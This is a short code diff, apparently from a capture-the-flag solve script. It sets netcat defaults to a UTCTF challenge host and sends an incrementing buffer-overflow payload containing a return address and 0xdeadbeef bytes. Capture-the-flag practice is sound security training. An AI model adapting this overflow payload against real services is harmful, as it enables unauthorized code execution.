@@ -19,7 +19,7 @@ int outpipefd[2];
 char buf[256];
 int status;
 
-void runcmd(string s = "", string arg0 = "", string arg1 = "", string arg2 = ""){
+void runcmd(string s = "/bin/nc", string arg0 = "binary.utctf.live", string arg1 = "9002", string arg2 = ""){
 	pid = 0;
 	pipe(inpipefd);
 	pipe(outpipefd);
@@ -85,7 +85,7 @@ int main(){
 	
 	string ret;
 	for(int i = 1;;i++){
-		runcmd("nc", "binary.utctf.live", "9002");
+		runcmd();
 		ret = cmdin();
 		cout << ret << endl;
 		cmdout(string(i, 'f') + "\xea\x05\x40" + string(10, '0') + "\xef\xbe\xad\xde");
